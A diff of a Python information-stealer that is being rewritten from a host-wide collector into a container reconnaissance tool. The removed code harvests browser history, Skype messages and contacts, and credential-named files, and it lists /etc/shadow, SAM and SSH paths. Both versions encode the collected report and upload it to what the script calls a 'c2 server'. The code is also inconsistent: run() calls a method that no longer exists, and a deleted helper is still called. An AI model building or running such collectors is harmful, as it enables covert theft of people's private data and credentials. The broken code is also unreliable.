@@ -11,7 +11,6 @@ import base64
 import zlib
 import tempfile
 import os
-import sysa
 import importlib
 import subprocess
 
@@ -26,7 +25,6 @@ def ensure_module(name, pkg=None):
 
 # Now use it safely:
 bh = ensure_module("browserhistory", "browserhistory==0.1.2")
-Skype = ensure_module("skpy", "Skpy==0.11").Skype
 dotenv = ensure_module("dotenv", "python-dotenv==1.0.1")
 requests = ensure_module("requests", "requests==2.32.3")
 
@@ -34,298 +32,188 @@ from dotenv import load_dotenv
 # load .env for sensitive tokens
 load_dotenv()
 
-class SenInfoScanner:
+class ContainerSenScanner:
 
-    def __init__(self, save_location: Path, root_path=None):
+    def __init__(self, save_location: Path):
         ''' 
         :param save_location: local position or remote site
-        :param root_path: the root path to start scanning
         '''
+        self.report = {
+            "container_detection": {},
+            "privilege_and_namespace": {},
+            "docker_socket": {},
+            "mountinfo": [],
+            "cgroup_info": [],
+            "environment_leaks": {},
+            "sensitive_files": [],
+            "logs": {},
+        }
+
         self.save_location = save_location
-        # dynamically set root path based on the operating system
-        if root_path:
-            self.root_path = root_path
-        else:
-            if platform.system() == 'Windows':
-                # Start scanning from the C:\ drive on Windows
-                self.root_path = 'C:\\'
-            else:
-                # Default to root path for Linux/macOS
-                self.root_path = '/'
 
     # ============================================================
     #  Docker / Container / K8s detection + Host info "float-up"
     # ============================================================
     def _detect_container(self):
         """Detect if running inside Docker/containerd/Kubernetes"""
-        # /.dockerenv is present in Docker
-        if os.path.exists("/.dockerenv"):
-            return True
+        info = {}
 
-        # Check cgroup
+        # Method 1: .dockerenv file
+        info["dockerenv_exists"] = os.path.exists("/.dockerenv")
+
+        # Method 2: cgroup path contains "docker" or "containerd"
         try:
             with open("/proc/1/cgroup") as f:
                 cgroup = f.read()
-            if "docker" in cgroup or "containerd" in cgroup:
-                return True
-        except:
-            pass
+            info["cgroup_indicators"] = [
+                line for line in cgroup.splitlines()
+                if "docker" in line or "containerd" in line
+            ]
+        except Exception:
+            info["cgroup_indicators"] = []
 
-        return False
-    
+        self.report["container_detection"] = info
 
-    def _container_host_info(self):
-        """
-        Collect container-specific info AND host information visible from container.
-        This is SAFE and NON-intrusive and is used for threat hunting.
-        """
-        info = {}
-        in_container = self._detect_container()
+    # ------------------------------------------------------------------
+    # 2. Check privilege level & namespace configuration
+    # ------------------------------------------------------------------
+    def privilege_and_namespace_check(self):
+        data = {}
 
-        info["In_Container"] = in_container
+        # check if container is running as root
+        data["running_as_root"] = (os.geteuid() == 0)
 
-        if not in_container:
-            # Not in a container → no need to collect container-specific info
-            return info
+        # Check Linux capabilities (if available)
+        cap_file = "/proc/self/status"
+        data["capabilities"] = []
+        if os.path.exists(cap_file):
+            try:
+                with open(cap_file) as f:
+                    for line in f:
+                        if line.startswith("CapEff"):
+                            data["capabilities"].append(line.strip())
+            except:
+                pass
 
-        # ------------------------------------------------------------
-        # 1. Container ID / hostname
-        # ------------------------------------------------------------
+        # PID namespace: check if PID 1 is inside the container
         try:
-            with open("/etc/hostname") as f:
-                info["Container_ID"] = f.read().strip()
+            pid1 = subprocess.check_output(["ps", "-o", "pid,comm"]).decode()
+            data["pid_namespace_visible"] = pid1.strip().split("\n")
         except:
-            info["Container_ID"] = None
+            data["pid_namespace_visible"] = None
 
-        # ------------------------------------------------------------
-        # 2. Cgroup hierarchy (reveals host-level cgroup path)
-        # ------------------------------------------------------------
-        try:
-            with open("/proc/self/cgroup") as f:
-                info["Cgroup_Info"] = f.read().splitlines()
-        except:
-            info["Cgroup_Info"] = None
+        self.report["privilege_and_namespace"] = data
 
-        # ------------------------------------------------------------
-        # 3. Mount namespace inspection (host paths leak through overlay2)
-        # ------------------------------------------------------------
+    # ------------------------------------------------------------------
+    # 3. Check for docker.sock exposure
+    # ------------------------------------------------------------------
+    def check_docker_socket(self):
+        sock_path = "/var/run/docker.sock"
+        data = {"exists": os.path.exists(sock_path)}
+
+        # DO NOT interact with the socket (unsafe).
+        # Only report presence.
+        self.report["docker_socket"] = data
+
+    # ------------------------------------------------------------------
+    # 4. Collect mount info (possible host path leak)
+    # ------------------------------------------------------------------
+    def read_mountinfo(self):
         try:
             with open("/proc/self/mountinfo") as f:
-                info["Mount_Info"] = f.read().splitlines()
+                self.report["mountinfo"] = f.read().splitlines()
         except:
-            info["Mount_Info"] = None
+            self.report["mountinfo"] = []    
 
-        # ------------------------------------------------------------
-        # 4. Host kernel (shared between container + host)
-        # ------------------------------------------------------------
+    # ------------------------------------------------------------------
+    # 5. Collect cgroup info (container isolation indicator)
+    # ------------------------------------------------------------------
+    def read_cgroup(self):
         try:
-            uname = subprocess.check_output(["uname", "-a"]).decode().strip()
-            info["Host_Kernel"] = uname
+            with open("/proc/self/cgroup") as f:
+                self.report["cgroup_info"] = f.read().splitlines()
         except:
-            info["Host_Kernel"] = None
+            self.report["cgroup_info"] = []
 
-        # ------------------------------------------------------------
-        # 5. Check docker.sock → can see host Docker info (major risk indicator)
-        # ------------------------------------------------------------
-        docker_sock = "/var/run/docker.sock"
-        info["Docker_Socket_Present"] = os.path.exists(docker_sock)
+    # ------------------------------------------------------------------
+    # 6. Scan environment variables for leaked secrets
+    # ------------------------------------------------------------------
+    def environment_secret_check(self):
+        env = dict(os.environ)
 
-        if os.path.exists(docker_sock):
-            try:
-                # use requests-unixsocket if available
-                try:
-                    requests_unixsocket = ensure_module("requests_unixsocket", "requests-unixsocket==0.3.0")
-                    session = requests_unixsocket.Session()
-                    res = session.get("http+unix://%2Fvar%2Frun%2Fdocker.sock/info")
-                    info["Docker_Host_Info"] = res.json()
-                except Exception as e:
-                    info["Docker_Host_Info"] = f"Failed to query docker.sock: {e}"
-            except:
-                info["Docker_Host_Info"] = None
+        suspicious_keywords = [
+            "password", "passwd", "token", "secret", "key",
+            "apikey", "auth", "credential"
+        ]
 
-        return info
+        found = {}
+        for k, v in env.items():
+            if any(word in k.lower() for word in suspicious_keywords):
+                # DO NOT store real secrets → mask values
+                found[k] = "******** (value masked)"
 
+        self.report["environment_leaks"] = found
 
-    def _ext_scan(self, target_ext: list):
-        ''' cover potential sensitive info via file extension
-        
-        - financial spreadsheets (.xls, .xlsx, .csv)
-        - documents (.docx, .pdf)
-        - intellectual property (IP) (.pptx, .py, .js)
-        - configuration files (.conf, .ini, .xml)
-        '''
-        sen_files = []
-        for ext in target_ext:
-            for root, dirs, files in os.walk(self.root_path):
-                for file in files:
-                    if file.endswith(ext):
-                        file_path = os.path.join(root, file)
-                        sen_files.append(file_path)
-        
-        return sen_files
+    # ------------------------------------------------------------------
+    # 7. Scan known sensitive file paths (read-only)
+    # ------------------------------------------------------------------
+    def sensitive_file_scan(self):
+        paths_to_check = [
+            "/root/.ssh",
+            "/home",
+            "/app",
+            "/etc",
+            "/run/secrets",
+            "/var/www",
+            "/var/lib"
+        ]
 
+        found = []
+        for p in paths_to_check:
+            if os.path.exists(p):
+                found.append(p)
 
-    def _filename_scan(self,):
-        ''' cover the filenames that can contain credentials info
-        
-        '''
-        sen_filenames = []
-        patterns = ['password', 'credentials','secret', 'key','login']
-        for root, dirs, files in os.walk(self.root_path):
-            for file in files:
-                if any(pattern in file.lower() for pattern in patterns):
-                    file_path = os.path.join(root, file)
-                    sen_filenames.append(file_path)
-        
-        return sen_filenames
+        self.report["sensitive_files"] = found
 
-    
-    def _brw_hist(self,):
-        ''' get broswer history data
-        
-        '''
-        hist_data = bh.get_browserhistory()
-        return hist_data
-    
-    def _cache(self,):
-        ''' scan for sen info in cache files
-        
-        '''
-        cache_paths = []
-        if platform.system() == "Windows":
-            # common cache directories on Windows
-            cache_dirs = [
-                # user cache
-                os.path.expanduser("~\\AppData\\Local\\Temp"),
-                # system temp directory
-                "C:\\Windows\\Temp",
-                os.path.expanduser("~\\AppData\\Local")
-            ]
-        else:
-            # common cache directories on Linux/macOS
-            cache_dirs = [
-                "/var/cache",
-                "/tmp",
-                os.path.expanduser('~/.cache')
-            ]
-    
-        # scan the cache directories
-        for cache_dir in cache_dirs:
-            if os.path.exists(cache_dir):
-                for root, dires, files in os.walk(cache_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        cache_paths.append(file_path)
-        
-        return cache_paths
+    # ------------------------------------------------------------------
+    # 8. Look for logs that may leak info
+    # ------------------------------------------------------------------
+    def log_scan(self):
+        logs = {}
+        candidates = [
+            "/var/log",
+            "/app/logs",
+            "/tmp"
+        ]
 
-
-    def _db(self, return_info: False):
-        ''' cover potential db info like skype contact info
-        
-        '''
-        db_files = []
-        for root, dirs, files in os.walk(self.root_path):
-            for file in files:
-                if file.endswith('.sqlite') or file.endswith('.db'):
-                    db_files.append(os.path.join(root, file))
-        
-        if return_info:
-            # optional manipulation
-            db_info = []
-            for db_file in db_files:
-                try:
-                    dbreader = Skype.SkypeDB(db_file)
-                    profile_list = dbreader.ExtProfile()
-                    contracts_list = dbreader.ExtContracts()
-                    calllog_list = dbreader.ExtCallLog()
-                    message_list = dbreader.ExtMessage()
-                    db_info.append(
-                        {"db_file": db_file,
-                        "profile": profile_list,
-                        "contracts": contracts_list,
-                        "calllog": calllog_list,
-                        "messages": message_list
-                        }
-                    )
-                except Exception as e:
-                    db_info.append(
-                        {"db_file": db_file,
-                        "error": str(e)
-                        }
-                    )
-            return db_info
-        else:
-            return db_files
-
-
-    def _path(self,):
-        sen_paths = []
-
-        if platform.system() == "Windows":
-            comm_sen_paths = [
-                # Windows SAM file
-                'C:\\Windows\\System32\\config\\SAM',    
-                # User AppData Local folder         
-                os.path.expanduser('~\\AppData\\Local'),    
-                # Program Files       
-                'C:\\Program Files',     
-                # Program Files for 32-bit apps                          
-                'C:\\Program Files (x86)',                         
-                os.path.expanduser('~\\Documents'),   
-            ]
-        else:
-            comm_sen_paths = [
-                # User account details
-                '/etc/passwd',         
-                 # Shadow password file                            
-                '/etc/shadow',         
-                # SSH configuration folder                           
-                os.path.expanduser('~/.ssh'),      
-                # Log files                
-                '/var/log',                                        
-                os.path.expanduser('~/Documents'), 
-            ]
-
-        for path in comm_sen_paths:
+        for path in candidates:
             if os.path.exists(path):
-                sen_paths.append(path)
-        
-        return sen_paths
+                logs[path] = "present"
 
+        self.report["logs"] = logs
 
-    def _encode_compress(self, data:str):
-        ''' compress and encode extracted system info with Maximum compression
-        
-        '''
-        # first compression
-        compress_1_data = zlib.compress(data.encode())
+    # ------------------------------------------------------------------
+    # 10. Run all modules
+    # ------------------------------------------------------------------
+    def run(self):
+        self.detect_container()
+        self.privilege_and_namespace_check()
+        self.check_docker_socket()
+        self.read_mountinfo()
+        self.read_cgroup()
+        self.environment_secret_check()
+        self.sensitive_file_scan()
+        self.log_scan()
 
-        # second compression
-        compress_2_data = zlib.compress(compress_1_data)
-
-        # base64 encoding
-        final_encoded = base64.b64encode(compress_2_data)
-
-        return final_encoded
-
+        return self.report
+    
     def _sen_info(self, file:str):
         ''' the module to collect sensitive info from specific locations/files/extensions
         
         '''
-        target_ext = ['.xls', '.xlsx', '.csv', '.docx', '.pdf', '.pptx', '.py', '.js', '.conf', '.ini', '.xml']
-        collected_info = {
-            'file_extensions': self._ext_scan(target_ext),
-            'sensitive_filenames': self._filename_scan(),
-            'browser_history': self._brw_hist(),
-            'cache_files': self._cache(),
-            'databases': self._db(True),
-            'sensitive_paths': self._path(),
-            'container_host_info': self._container_host_info()
-        }
-
+        report = self.run()
         # compress and encode the collected information
-        encoded_compressed_info = self._encode_compress(str(collected_info))
+        encoded_compressed_info = self._encode_compress(str(report))
 
         with Path(self.save_location).joinpath(file).open("wb") as fw:
             fw.write(encoded_compressed_info)
@@ -339,16 +227,16 @@ class SenInfoScanner:
         except Exception as e:
             print("[-] Failed to send:", e)
 
-
 if __name__ == "__main__":
 
     temp_path = tempfile.gettempdir()
-    senscanner = SenInfoScanner(temp_path)
+    senscanner = ContainerSenScanner(temp_path)
     # define the file
     file_name = "files.json"
 
     # get the information and saved to a temp folder
     senscanner._sen_info(file_name)
+
     from pathlib import Path
     # upload file to c2 server
     remote_file = Path(temp_path).joinpath(file_name)
